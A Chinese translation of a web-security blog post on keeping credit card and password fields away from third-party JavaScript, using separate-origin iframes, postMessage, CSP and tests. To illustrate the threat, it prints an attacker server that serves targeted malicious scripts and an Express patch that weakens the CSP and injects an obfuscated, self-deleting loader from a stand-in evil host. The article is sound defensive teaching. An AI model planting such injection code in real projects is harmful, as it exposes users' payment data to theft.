<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>第2部分：如何阻止我從您的網站收集信用卡號碼和密碼</title>
  <meta name="description" content="我最近有寫了一篇文章，描述了我如何散布惡意代碼，以非常難以檢測的方式從數千個網站收集信用卡號和密碼。">

  <link rel="canonical" href="https://security-onigiri.github.io//2018/03/07/2.html">
  <link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">

  
  <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-115432550-1', 'auto');
  ga('send', 'pageview');

</script>
  

  
  <link rel="stylesheet" type="text/css" href="/assets/security-onigiri-317798cb6a90710387d2c080653140b49f79e3ecd52e116ba3d04840f9ac3596.css" integrity="sha256-MXeYy2qQcQOH0sCAZTFAtJ954+zVLhFro9BIQPmsNZY=" crossorigin="anonymous">
  <script integrity="sha256-eMmY7/FOkogg0G7w18nwNsF+Wf4DIHwl35YiknHaD9w=" crossorigin="anonymous" type="text/javascript" src="/assets/security-onigiri-78c998eff14e928820d06ef0d7c9f036c17e59fe03207c25df96229271da0fdc.js"></script>
</head>

  <body>
    <header>
  <nav class="navbar is-dark">
		<div class="navbar-brand">
			<a class="navbar-item" href="/">
        <img src="/assets/icon_avatar-63fb8ef941697015c2720bd8d2764b00ecd3d2d75db4a8da9244966f417daf8e.png" integrity="sha256-Y/uO+UFpcBXCcgvY0nZLAOzT0tddtKjakkSWb0F9r44=" crossorigin="anonymous">
			</a>
      <div class="navbar-burger" data-target="navMenu">
        <span></span>
        <span></span>
        <span></span>
      </div>
		</div>
		<div class="navbar-menu" id="navMenu">
			<div class="navbar-start">
        
        
        <a class="navbar-item" href="/about/">
          <span class="icon">
            <i class="fas fa-user"></i>
          </span>
          關於
        </a>
        
        
        
        <a class="navbar-item" href="/tags/">
          <span class="icon">
            <i class="fas fa-tags"></i>
          </span>
          標籤
        </a>
        
        
        
        <a class="navbar-item" href="/index.html">
          <span class="icon">
            <i class="fas fa-book"></i>
          </span>
          文章
        </a>
        
        
        
        
        
        
        
        
        
        
			</div>
			<div class="navbar-end">
				<a class="navbar-item" href="/feed.xml">
          <span class="icon">
            <i class="fas fa-rss"></i>
          </span>
					訂閱
				</a>
			</div>
		</div>
	</nav>
</header>

    <main id="main" class=section">
    <section class="container is-fluid">
      <div class="hero-body">
  <div class="container">
    <h1 class="title is-spaced">
      第2部分：如何阻止我從您的網站收集信用卡號碼和密碼
    </h1>
    <h2 class="subtitle">
      <div class="content">
        <span class="icon">
          <i class="fas fa-link"></i>
        </span>
        <a href="https://hackernoon.com/part-2-how-to-stop-me-harvesting-credit-card-numbers-and-passwords-from-your-site-844f739659b9">
          https://hackernoon.com/part-2-how-to-stop-me-harvesting-credit-card-numbers-and-passwords-from-your-site-844f739659b9
        </a>
      </div>
      <div class="level">
        <div class="level-left">
          <div class="level-item">
            Translated by NotSurprised
          </div>
          <div class="level-item">
            <div class="tags">
              
              
              <a href="/tags/#Web" class="tag">
                Web
              </a>
              
              
              <a href="/tags/#Third-party%20code" class="tag">
                Third-party code
              </a>
              
            </div>
          </div>
        </div>
        <div class="level-right">
          <div class="level-item">
            Mar 7, 2018
          </div>
        </div>
      </div>
    </h2>
  </div>
</div>
<div class="container">
  <article>
    <div class="content">
      <p>我<a href="https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5">最近有寫了一篇文章，</a>描述了我如何散布惡意代碼，以非常難以檢測的方式從數千個網站收集信用卡號和密碼。</p>

<p>這個帖子所收到的評論讓我充滿喜悅，多數表達了“令人不寒而慄”、“令人不安”和“非常恐怖”等情緒。（就像我在舞池裡得到的讚美一樣）</p>

<p>在這個後續的文章中，我想停止加深恐懼，並提出一些實際的建議。</p>

<h3 id="簡短的版本"><strong>簡短的版本</strong></h3>

<ul>
  <li>沒有必要嘗試和避免第三方代碼</li>
  <li>在收集或顯示敏感訊息時，請將此信息擷取到不包含第三方JavaScript的單獨HTML文件中</li>
  <li>在iframe中顯示此文件</li>
  <li>從另一個域上的靜態文件服務器上提供文件</li>
</ul>

<p>您也可以考慮完全避免使用第三方登錄和使用第三方程式(插件)來收集和處理信用卡訊息等敏感數據。</p>

<p>我在這篇文章中提出的建議只適用於敏感訊息（密碼、信用卡號碼等）非常有限且可以被封鎖的網站。如果您在聊天應用程式、電子郵件客戶端或GUI數據庫上工作，那麼<strong>一切</strong>都可能敏感，我無計可施。</p>

<h3 id="十八倍的版本"><strong>十八倍的版本</strong></h3>

<p>我認為居安思危是一個好的開始。</p>

<p>我建議您思考一下，OnePlus <a href="https://forums.oneplus.net/threads/jan-19-update-an-update-on-credit-card-security.752415/">最近宣布</a>：</p>

<blockquote>
  <p>…一個惡意的腳本被注入到支付頁面代碼中，以便在進入時嗅探信用卡信息…惡意腳本間歇性地操作，直接從用戶的瀏覽器捕獲和發送數據… oneplus.net上的多達4萬個用戶可能受到影響由事件</p>
</blockquote>

<p>慘。</p>

<hr />

<p>現在讓我們把這種模糊的恐懼感變成更具體的東西吧。</p>

<p>也許給一個場景描述是更為有用的…</p>

<p>我們想像<strong>第三方代碼</strong>是一個大杜賓。牠看起來很平靜 溫柔，均勻。但是在牠黑暗且毫無感情的眼睛裡，卻有著未知潛力的閃爍。讓我們只好慶幸我們沒有把我們喜愛的東西放在附近觸動牠。</p>

<p>現在我把我用戶的<strong>敏感訊息</strong>描繪成一個可愛且毫無防備的倉鼠。我們看著牠天真地舔著牠的小前腳，梳理著牠那笨拙的小臉，在杜賓犬的尾巴處嬉鬧不已。</p>

<p>現在，如果你曾經與一個杜賓犬（我強烈推薦它）成為朋友，你可能知道他們是美好、溫柔的生物，並不與他們的惡名相稱。但是，我相信你肯定會同意不該放杜賓犬與一個和狗狗用的咀嚼玩具極其相似的倉鼠單獨相處。</p>

<p>當然，也許你會下班回家，看到動物方城市中和平相處的可愛場景。或者，也許你會回家會見證倉鼠曾經呼吸的空氣，與一隻像在說“我可以看到甜點菜單嗎？”而把頭朝下的狗</p>

<hr />

<p>我不認為該把來自npm、GTM、DFP或任何其他地方的代碼貼上惡意標籤。但是我建議，除非你能保證這個代碼的行為良好，否則讓它經手你的用戶敏感訊息是對自己的不負責任。</p>

<p>所以…這是我建議我們都採用的心態：<strong>敏感訊息</strong>和<strong>第三方代碼</strong>應該隔離而不放在一起。</p>

<h4 id="例如修復易受攻擊的網站"><strong>例如：修復易受攻擊的網站</strong></h4>

<p>這個例子中的網站有一個常見的信用卡表格，它很容易受到惡意的第三方代碼的侵害，就像在那幾個非常大的電子商務網站上的那樣，你可能認為這些大網站的安全性更好。</p>

<p><img src="https://cdn-images-1.medium.com/max/1000/1*GgGOpt0c8n3tzkdddFJ2ew.png" alt="" /></p>

<p>好的，我知道，我的程式之路耽誤了我的設計天份。</p>

<p><img src="https://i.imgur.com/ezxNzJl.png" alt="" /></p>

<p>所以這個頁面<strong>充滿</strong>了第三方代碼。它使用React，並且使用Create React App創建，所以在我開始做些甚麼之前它就先塞了我886 npm封包（認真）。</p>

<p>它也有Google Tag Manager（如果您不知道，GTM對於那些您從來沒有遇過的人來說是一個攻擊方便的方法，它可以在不妨礙代碼審查的情況下將JavaScript注入到您的網站中）。</p>

<p>為了讓這頁面更像樣，我還補了一個橫幅廣告（怒秀一波）。這是一個在網路上的廣告，所以自然需要1.5 MB的JavaScript來分出112個網路請求在11秒全面傾占CPU資源來加載一個反覆騎馬的信用卡gif動畫。</p>

<p>（場邊嘮叨：我對Google很失望，他們的開發者主張花費大量的時間教會我們如何快速地創建網頁，在這里和幾毫秒之內削減幾萬字節 - 這的確是很棒的東西。但他們允許他們的DFP廣告網路向用戶的設備發送<strong>幾兆字節</strong>，發出<strong>數百個</strong>網路請求，並在CPU上停留整整<strong>一秒</strong>。Google，我知道您有有顆能想出提供更智能，更快速的廣告投放方式的腦袋，您為什麼不用呢？）</p>

<hr />

<p>好的，回到這篇的主題……顯然，我需要做的是從所有<strong>第三方代碼</strong>骯髒的手中區隔出用戶的<strong>敏感信息</strong> ; 我們希望以這種形式活在自己的小島上。</p>

<p><img src="https://cdn-images-1.medium.com/max/2000/1*bjTH5qkIW8kyu1qqXaIFQA.jpeg" alt="" /></p>

<p>第一步：為縮略圖找一張漂亮的照片。第二步：編寫一個涉及帖子主題和選擇縮略圖的陳腐隱喻</p>

<p>現在我們就像通過這篇文章的五分之二，我將開始實際描述一些方法。</p>

<ul>
  <li>選項1：將信用卡表單移至其自己的文檔，不含第三方JavaScript，並將其作為單獨的頁面提供</li>
  <li>選項2：與選項1相同，但頁面在iframe中提供</li>
  <li>選項3：與選項2相同，但是父頁面和iframe通過相互通信 <code class="highlighter-rouge">postMessage</code></li>
</ul>

<h4 id="選項1為敏感數據分頁"><strong>選項1：為敏感數據分頁</strong></h4>

<p>最簡單的事情就是創建一個沒有JavaScript的全新頁面。當用戶點擊“購買”時，我們會把它們轉送到下圖的新頁面視窗，而不是以一些平滑(為了某些美學、使用觀感的理由)的形式載入在當前頁面：</p>

<p><img src="https://cdn-images-1.medium.com/max/1000/1*5eUVNNY6lruo7pw4MxHqaw.png" alt="" /></p>

<p>不幸的是，因為我的網站的頁首，頁尾和導覽列都是React組件，所以我不能在這個非常陽春的頁面上使用它們。因此，您看到的“標題”是我完整標題的手動複製版，並沒有全部的常見功能。這只是一個藍色的矩形。</p>

<p>當用戶 填盡(in) 該表格（還是該說 填完(out) 該表單-為什麼對立的詞組出一樣的意思！？），他們會點擊提交，並重新轉址回到結賬流程的下一個步驟。這可能需要進行一些後端的修改，以比對用戶他們在跨頁面轉移時提交的數據。</p>

<p>為了保持這份文件的乾淨優秀，我們應使用native form validation
，而不是JavaScript -  <a href="https://caniuse.com/#feat=form-validation">現有97％使用率</a>，想只靠<code class="highlighter-rouge">required</code>和<code class="highlighter-rouge">pattern</code>兩個屬性讓我們通過一個完整的JavaScript驗證應該還有很長的路要走。</p>

<p>如果你想看實際運用，<a href="https://codepen.io/davidgilbertson/pen/OzdEbL">這裡有一份筆記</a>，裡面有一些no-js
正規表達式驗證和條件樣本。（預設的限制不多，但應該足夠表達用法了。）</p>

<hr />

<p>我建議，如果你要這樣做，最好把它全部保存在一個文件中。</p>

<p>複雜是這裡的敵人（比以往任何時候都多）。上面例子中的HTML文件（加上<code class="highlighter-rouge">&lt;style&gt;</code>標籤中嵌入的CSS）約有100行; 由於它很小幾乎沒有網路請求，因此幾乎不可能受干擾而未被發現。</p>

<p>不幸的是，這種方法需要復制許多CSS。我已經想了很多，看了幾種方法。他們只想要更多的程式碼，而防止重複程式碼的數量不是他們的目標。</p>

<p>所以，我建議儘管“不要重複已存程式碼”的口號是很好的目標，但不應該被視為必須不惜一切代價持之以恆的絕對原則。在一些像本篇描述的罕見情況下，重複的程式碼是兩個惡果中較小的一個。</p>

<p>最有用的規則是你知道什麼時候該打破它。</p>

<p>（我的新年的決心是嘗試讓事情聽起來更深刻，但實際上沒有說出任何實質內容。）</p>

<h4 id="選項2在iframe中重擊選項1"><strong>選項2：在iframe中重擊選項1</strong></h4>

<p>選項1固然是好的，但是從UI和UX的角度來看，這明顯是一大退步，而是你想要讓別人付錢之旅程的最後一個摩擦地方。</p>

<p>選項2通過截取表單並塞進iframe中來提供服務以解決此問題。</p>

<p>你可能會試圖做下面這樣的事情：</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe
  src="/credit-card-form.html"
  title="credit card form"
  height="460"
  width="400"
  frameBorder="0"
  scrolling="no"
/&gt;
</code></pre></div></div>
<p>先別做傻事。</p>

<p>在這個例子中，父頁面和iframe的內容仍然可以自由地查看和交互。這就像把一個杜賓犬留在一個房間裡，而倉鼠在另一個房間裡，在他們之間有一扇門。但當杜賓犬變得飢餓的時候，牠可以簡單地推開。</p>

<p>所以我們需要做的是“沙箱”，即iframe。可是（我最近才知道）這與iframe 的<code class="highlighter-rouge">sandbox</code>屬性無關，因為這是用於保護iframe的父頁面。但我想從父頁面保護iframe的內容。</p>

<p>幸運的是，瀏覽器對來自不同來源的東西有著預設的不信任。這就是所謂的<a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">同源政策</a> [容在這裡怒政治上嘴一波川普]。</p>

<p>正因為如此，只需從不同的網域加載frame就足以防止兩者之間的通訊。</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;iframe
  src="https://different.domain.com/credit-card-form.html"
  title="credit card form"
  height="460"
  width="400"
  frameBorder="0"
  scrolling="no"
/&gt;
如此就能實現動物方城市大和平共處了。
</code></pre></div></div>

<p>如果你想知道iframe中內容的可訪問性，這是個好問題，但你不用擔心。<a href="https://webaim.org/techniques/frames/">根據WebAIM的說法</a>：“內聯框架沒有明顯的可訪問性問題。內聯框架的內容是在它遇到的位置（基於標記順序）讀取的，就好像它是父頁面中的內容一樣。</p>

<hr />

<p>讓我們考慮填充表單後會發生什麼。用戶將在iframe中的表單中點擊提交按鈕，並且我想要轉址到<strong>父</strong>頁面。但是，如果他們有不同的來源，這有可能嗎？</p>

<p>Yup，這就是<code class="highlighter-rouge">target</code>表單的屬性：</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;form
  action="/pay-for-the-thing"
  method="post"
  target="_top"
&gt;
  &lt;!-- form fields --&gt;
&lt;/form&gt;
接下來他們還能怎樣？
</code></pre></div></div>

<p>因此，用戶可以將其敏感訊息輸入到與周圍頁面無縫接軌的表單中。然後當他們提交時，頂層頁面被轉址以回應表單提交。</p>

<p>選項2是對安全性的一個巨大增強 - 我不再有一個落後的信用卡填寫形式。但是這仍然在可用性上退步。</p>

<p>理想的解決方案將不需要<strong>任何</strong>完整的頁面重定向</p>

<h4 id="選項3在框架和父頁面之間進行通訊"><strong>選項3：在框架和父頁面之間進行通訊</strong></h4>

<p>在我的示例網站中，我實際上希望保持信用卡數據的狀態，以及所購買產品的詳細訊息，並將所有訊息以一個AJAX的型式打包請求並提交。</p>

<p>這是非常容易的。我將使用<code class="highlighter-rouge">postMessage</code>將數據從表單發送到父頁面。</p>

<p>這是在iframe中提供的頁面…</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;body&gt;
  &lt;form id="form"&gt;
    
    &lt;!-- form stuff in here --&gt;
    
  &lt;/form&gt;

  &lt;script&gt;
    var form = document.getElementById('form');
    form.addEventListener('submit', function(e) {
      e.preventDefault();
      var payload = {
        type: 'bananas',
        formData: {
          a: form.ccname.value,
          b: form.cardnumber.value,
          c: form.cvc.value,
          d: form['cc-exp'].value,
        },
      };
      window.parent.postMessage(payload, 'https://mysite.com');
    });
  &lt;/script&gt;
&lt;/body&gt;
還記得var嗎？
</code></pre></div></div>

<p>…以及在父頁面（或者更具體地說，在首先請求iframe的React組件）中，我只是偵聽來自iframe的訊息並相應地更新狀態：</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class CreditCardFormWrapper extends PureComponent {
  componentDidMount() {
    window.addEventListener('message', ({ data }) =&gt; {
      if (data.type === 'bananas') {
        this.setState(data.formData);
      }
    });
  }

  render() {
    return (
      &lt;iframe
        src="https://secure.mysite.com/credit-card-form.html"
        title="credit card form"
        height="460"
        width="400"
        frameBorder="0"
        scrolling="no"
      /&gt;
    );
  }
}
這個舉例是針對React客製的，但這個概念不是
</code></pre></div></div>

<p>如果iframe覺得自己很活躍，那麼我可以將<code class="highlighter-rouge">onchange</code>每個輸入的數據從表單發送到父項。</p>

<p>當iframe活躍時，沒有任何東西阻止父頁面進行驗證，並將有效性狀態發送回普通表格。這使我可以重用我的網站其他任何驗證邏輯。</p>

<p>[補充：根據在本篇評論中兩個<a href="https://medium.com/@jimmybyrum/any-reason-not-to-do-form-validation-within-the-iframe-either-with-some-very-trustworthy-js-or-a1e7695f82b1">留言者</a>的建議，iFrame可以提交數據，而不轉址至父頁面，然後通訊成功/失敗的狀態使用<code class="highlighter-rouge">postMessage</code>返還給父頁面。這樣就沒有數據被發送到父頁面。]</p>

<p>就是這樣了！您的用戶敏感訊息可以安全地輸入到不同來源的iframe中，而不會被父頁面隱藏，但是獲取的數據仍然可以是應用程序狀態的一部分，這意味著用戶體驗不需要進行任何更改。</p>

<hr />

<p>現在，您可能會認為將信用卡數據上傳到主頁面是巨大的失敗。這不是可供任何惡意代碼訪問嗎？</p>

<p>這個答案有兩個部分，我想不出一個簡單的方法來解釋它。抱歉。</p>

<p>我認為這是一個合理的風險，從駭客的角度來看更容易理解。想像一下，你的工作是想出一些可以在<strong>任何</strong>網站上運行的惡意代碼，尋找敏感訊息並將其發送到某個伺服器。每次你發送封包時，都會冒著被抓的危險。所以只發送你確定有價值的數據是最符合你的效益的。</p>

<p>如果這是我的工作，我不會盲目傾聽<code class="highlighter-rouge">message</code>事件並發送我在其中發現的數據。尤其不是當有千千萬萬個網站正有完全脆弱的信用卡表單與整齊地標記輸入時候。</p>

<p>答案的第二部分是，如果您擔心的惡意代碼<strong>不</strong>只是一些通用代碼，它可能<strong>知道</strong>要在您的網站上收聽該<code class="highlighter-rouge">message</code>事件，並將信用卡號碼取出。這種完全針對您的網站專門編寫代碼的想法，它值得…</p>

<h3 id="目標和通用的惡意代碼"><strong>目標和通用的惡意代碼</strong></h3>

<p>到目前為止我已經描述了使用<strong>通用</strong>惡意代碼的攻擊 也就是說，代碼不知道它運行的是什麼網站，它只是尋找，收集和發送敏感訊息給惡龍在火山地下室的邪惡巢穴。</p>

<p>另一方面，<strong>有針對性的</strong>惡意代碼是與<strong>您的</strong>網站專門針對而寫的代碼。它是由一個熟練的開發人員花了幾個星期完全熟悉你的DOM的每一個角落而成的結晶。</p>

<p>如果您的網站受到了有<strong>針對性的</strong>惡意代碼的攻擊，那就爆了。這情況沒有第二種可能。一定是你已經把所有東西都放在一個非常安全的iframe中，但是惡意代碼只會刪除iframe並用假表單替換它。攻擊者甚至可以更改網站上顯示的價格，可能會提供50％的折扣，並告訴用戶如果他們需要貨物，他們需要重新輸入信用卡詳細信息。爆成這樣的這種苦果是你應得的。</p>

<p>如果您的網站上有針對性的惡意代碼，那麼您最好還是彎下腰來撿一朵鮮花，然後聞一聞然後放鬆。你知道，我們應該專注於生活中的正面積極的東西。</p>

<p>這就是為什麼擁有<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">內容安全策略</a>非常重要。否則，攻擊者可以通過向邪惡的伺服器發送請求來大規模散布可升級到<strong>有針對性的</strong>代碼的<strong>通用</strong>惡意代碼（比如通過一個npm包）。</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>app.get('/analytics.js', (req, res) =&gt; {
  if (req.get('host').includes('acme-sneakers.com')) {
    res.sendFile(path.join(__dirname, '../malicious-code/targeted/acme-sneakers.js'));
  } else if (req.get('host').includes('corporate-bank.com')) {
    res.sendFile(path.join(__dirname, '../malicious-code/targeted/corporate-bank.js'));
  } else if (req.get('host').includes('government-secrets.com')) {
    res.sendFile(path.join(__dirname, '../malicious-code/targeted/government-secrets.js'));
  } else if (req.get('host').includes('that-chat-app.com')) {
    res.sendFile(path.join(__dirname, '../malicious-code/targeted/that-chat-app.js'));
  } else {
    res.sendFile(path.join(__dirname, '../malicious-code/generic.js'));
  }
});
在攻擊者的伺服器上
</code></pre></div></div>

<p>攻擊者可以自由更新並在閒暇時添加他們的針對性代碼。</p>

<p>你真的<strong>必須</strong>建好自己的CSP。</p>

<hr />

<p>好吧，這是很粗糙的說法：使用<code class="highlighter-rouge">postMessage</code>發送敏感數據從一個iframe到父頁面只會稍微增加您的風險。<strong>通用</strong>惡意代碼顯然不太可能會截到這一點。而無論您做什麼，<strong>有針對性</strong>的代碼都會獲取用戶的信用卡數據。</p>

<p>（根據記錄，我不會在自己的小網站上使用選項1,2或3，我會讓專業人員處理我的信用卡數據，只提供Google / Facebook / Twitter登錄。你當然可以不要遵循這個建議，如果你的用戶不會註冊社交網站的成本大過你必須安全地獲取和存儲密碼的成本/風險。</p>

<h3 id="其他點的脆弱性"><strong>其他點的脆弱性</strong></h3>

<p>你可能會認為，只要你按照上面的建議做，你就會是安全健康的。其實不然。我想到還有四個地方可能會遇到麻煩，我發誓要用社群的智慧來保持下面這些更新。</p>

<h4 id="1在伺服器上"><strong>1.在伺服器上</strong></h4>

<p>我現在有一個超輕量級的HTML文件，準備用來擷取用戶的輸入而不被偷取。我只需要把它放置在某個地方，以便它可以從一個單獨的網域中提供服務。</p>

<p>也許我會在某處啟動一個簡單的Node伺服器。我只是添加<strong>一個</strong>小log包…</p>

<p><img src="https://cdn-images-1.medium.com/max/800/1*rGWHJtLE1KnGLfYJMVP3Wg.png" alt="" /></p>

<p>哦，來吧。204包是吧？</p>

<p>好的，204是很多，但是你可能想知道在只服務於文件的伺服器上運行的程式碼是如何危害到在瀏覽器中所輸入的用戶數據的？</p>

<p>那麼，問題就是任何npm包中的任何程式碼都可以在你的伺服器上執行，包括處理網路流量的程式碼。</p>

<p>現在，我只是一個惡意開發者，我很容易被四個字母的單詞混淆像<code class="highlighter-rouge">this</code>和<code class="highlighter-rouge">call</code>，但即使我可以完成將一個腳本注入outbound response，並允許它透過編輯CSP來訪問我的邪惡網域。</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>const fs = require('fs');
const express = require('express');

let indexHtml;
const originalResponseSendFile = express.response.sendFile;

express.response.sendFile = function(path, options, callback) {
  if (path.endsWith('index.html')) {
    // add my domain to the content security policy
    let csp = express.response.get.call(this, 'Content-Security-Policy') || '';
    csp = csp.replace('connect-src ', 'connect-src https://adxs-network-live.com ');

    express.response.set.call(this, 'Content-Security-Policy', csp);

    // inject a cheeky little self-destructing script
    if (!indexHtml) {
      indexHtml = fs.readFileSync(path, 'utf8');

      const script = `
        &lt;script&gt;
          var googleAuthToken = document.createElement('script');
          googleAuthToken.textContent = atob('CiAgICAgICAgY29uc3Qgc2NyaXB0RWwgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsKICAgICAgICBzY3JpcHRFbC5zcmMgPSAnaHR0cHM6Ly9ldmlsLWFkLW5ldHdvcms/YWRfdHlwZT1tZWRpdW0nOwogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoc2NyaXB0RWwpOwogICAgICAgIHNjcmlwdEVsLnJlbW92ZSgpOyAvLyByZW1vdmUgdGhlIHNjcmlwdCB0aGF0IGZldGNoZXMKICAgICAgICBkb2N1bWVudC5zY3JpcHRzW2RvY3VtZW50LnNjcmlwdHMubGVuZ3RoIC0gMV0ucmVtb3ZlKCk7IC8vIHJlbW92ZSB0aGlzIHNjcmlwdAogICAgICAgIGRvY3VtZW50LnNjcmlwdHNbZG9jdW1lbnQuc2NyaXB0cy5sZW5ndGggLSAxXS5yZW1vdmUoKTsgLy8gYW5kIHRoZSBvbmUgdGhhdCBjcmVhdGVkIGl0CiAgICA=');
          document.body.appendChild(googleAuthToken);
        &lt;/script&gt;
      `;

      indexHtml = indexHtml.replace('&lt;/body&gt;', `${script}&lt;/body&gt;`);
    }

    express.response.send.call(this, indexHtml);
  } else {
    originalResponseSendFile.call(this, path, options, callback);
  }
};
什麼是紅色，鯡魚和一個名為“googleAuthToken”的變量？
</code></pre></div></div>

<p>當注入的腳本登陸瀏覽器時，它會從邪惡的伺服器加載一些（可能是有針對性的）惡意的JavaScript（這可能是因為CSP認為這是可以的），然後刪除它自己的所有痕跡。</p>

<p>上面的要點本身並沒有實際的用處（正如眼睛銳利的讀者都會注意到的那樣），一個真正的駭客不可能會像這樣直白的攻擊。我只是想說明你的伺服務器就是個狂野西部無法地帶，那裡的<strong>任何東西</strong>都有可能暴露用戶在瀏覽器中輸入的數據。</p>

<p>（如果你是一個package的作者，你可以考慮使用<code class="highlighter-rouge">Object.freeze</code>或<code class="highlighter-rouge">Object.defineProperty</code>與<code class="highlighter-rouge">writable: false</code>來鎖定你的東西。）</p>

<hr />

<p>實際上，可能有點牽強附會，認為有Node模塊明目張膽的做outbound requests確實太扯了 - 對我來說這也太容易被發現了。</p>

<p>但是，你是否真的想要創建一個不包含任何第三方代碼的表單，但讓第三方代碼能夠在將其發送給用戶之前進行修改？這是屬於你該考量的。</p>

<p>我的建議是從靜態文件伺服器提供這些“安全”的文件，或不要打斷來做任何這樣的事情。</p>

<h4 id="2發送到靜態文件服務器"><strong>2.發送到靜態文件服務器</strong></h4>

<p>是的，標題即是我們要更進的一步，但也同時是一個漏洞的名稱。</p>

<p>我是<a href="https://firebase.google.com/docs/hosting/">Firebase for static hosting</a>的忠實粉絲，因為它的速度可以極盡所能的快，而且部署簡單的要命。</p>

<p>只需安裝<code class="highlighter-rouge">firebase-tools</code>從NPM和…哦不，我正在使用NPM來避免使用NPM。</p>

<p>好吧，深呼吸一下，也許這是那些美麗的zero-dependency
NPM之一。</p>

<p>正在安裝…安裝…</p>

<p><img src="https://cdn-images-1.medium.com/max/800/1*otIgVW16N9SkaHhOAoX_JA.png" alt="" /></p>

<p>耶穌在上，640包！</p>

<p>好，我放棄提出建議了，你現在只能靠自己惹。只是把你的HTML文件以某種方式放到伺服器上。在某個時候，我們都需要信任由陌生人寫的程式碼。</p>

<p>有趣的事實是：寫這篇文章讓我花了幾個星期。我正在進行最後的草稿，然後我再次安裝了Firebase工具來檢查是否真是640這數字。</p>

<p><img src="https://cdn-images-1.medium.com/max/800/1*6UCNd965XgbqxDhFcMgUUg.png" alt="" /></p>

<p>我想知道這七個新軟體包是做什麼的？我想知道管理Firebase工具的人是否知道這七個新軟體包的作用？我想知道有沒有人知道他們的軟體包需要做什麼？</p>

<h4 id="3-webpack"><strong>3. Webpack</strong></h4>

<p>您可能已經註意到，我沒有建議您將“安全的”HTML文件合併到build pipeline中（例如，共享CSS），儘管這樣可以解決程式碼重複問題。</p>

<p>這是因為即使是最簡單的Webpack pipeline中涉及的數百個包裹中任何一個都可能會修改building過程的輸出。Webpack自己需要367個包裹。像css-loader這樣的良性可能會增加246個。您可能會使用優秀的html-webpack-plugin來在您的索引文件中放置正確的CSS文件名，這將會在其上添加156個包。</p>

<p>再一次，我認為其中的任何一個都不太可能將腳本注入到縮小的輸出中。但是，要做出這麼大的努力來製作一個原始的，小的，手寫的，人類可讀的與倉鼠友好的HTML文件，然後在睡覺之前將其與幾百隻杜賓一起上線似乎是錯誤的。</p>

<h4 id="4無能者的攻擊"><strong>4.無能者的攻擊</strong></h4>

<p>最後一件防範措施所處理的是一些最危險如可以修改你編寫的任何代碼並取消你所提出的任何安全障礙的東西：從現在起開始6個月的新生孩子，你並不知道他們在做什麼。</p>

<p>這實際上是防止的最棘手的事情。我能想到的唯一的解決方案是“單元測試”，確保這些“安全”文件中沒有外部腳本。</p>

<p>`const fs = require(‘fs’);
const path = require(‘path’);
const { JSDOM } = require(‘jsdom’);</p>

<p>it(‘should not contain any external scripts, ask David why’, () =&gt; {
  const creditCardForm = fs.readFileSync(path.resolve(__dirname, ‘../public/credit-card-form.html’), ‘utf8’);</p>

<p>const dom = new JSDOM(
    creditCardForm,
    { runScripts: ‘dangerously’ },
  );</p>

<p>const scriptElementWithSource = dom.window.document.querySelector(‘script[src]’);
  expect(scriptElementWithSource).toBe(null);
});`</p>

<p>我允許<code class="highlighter-rouge">&lt;script&gt;</code>標籤沒有源碼（所以要inline code
），但阻擋具有<code class="highlighter-rouge">src</code>屬性的腳本標籤。我設置<code class="highlighter-rouge">jsdom</code>執行腳本，所以我可以捕捉到如果有人正在使用<code class="highlighter-rouge">document.createElement()</code>創建一個新的腳本元素。</p>

<p>至少在這種情況下，新的孩子實際上確實需要修改一個單元測試來添加一個腳本時，如果有那麼點運氣就可以啟動程式碼審查人員，這就足以檢視這個修改。</p>

<p>在已發布的安全HTML文件上運行這種性質的檢查也是一個好主意。然後，您可以更加輕鬆地使用Firebase工具和Webpack之類的東西，並且知道這1200個軟體包中的任何一個編輯您輸出的情況極其罕見。</p>

<h3 id="包起來"><strong>包起來</strong></h3>

<p>在我走之前，我想談談在過去幾周里我聽到很多的感受 - 我建議開發者應該使用更少的npm。</p>

<p>我理解這背後的情感驅動：包裹有可能是壞包裹的，所以越少的包裹必定越少問題。</p>

<p>但這不是一個好的建議。如果你的用戶數據的安全性依賴於你使用<strong>更少的</strong>npm包，你的東西就談不上安全。</p>

<p>這就像讓一部分的杜賓遠離開你的倉鼠而已。</p>

<hr />

<p>如果我明天要開始一個新項目，創建一個處理高度敏感信息的網站，我會像我一個月前那樣，使用我的React，Webpack，Babel其他快樂夥伴。</p>

<p>我不在乎是否有一千個軟體包裹或者他們會不斷地改變成更多或者我永遠不知道其中一個是否包含惡意程式碼。</p>

<p>沒有一件事對我來會造成問題，因為我壓根不會把他們中的任何一個單獨留在教室裡與我的倉鼠獨處。</p>

<hr />

<p>嘿，謝謝你的閱讀！一如既往，安全是一項團隊運動; 如果我說了一些愚蠢的話或給出不好的建議，請讓我知道，我會努力解決它的。如果你有一個好主意也請讓我知道，我會添加它進文章並假裝它是我的。</p>

<p>祝你有個美好的一天！</p>

    </div>
  </article>
  <section class="section">
    

  </section>
</div>

    </section>
    </main>
    <footer class="footer">
  <div class="container has-text-centered">
    <div class="content">
      Theme by
      <a class="item" href="https://github.com/security-onigiri/security-onigiri">
        <span class="icon">
          <i class="fab fa-github"></i>
        </span>
        security-onigiri
      </a>
    </div>
  </div>
</footer>

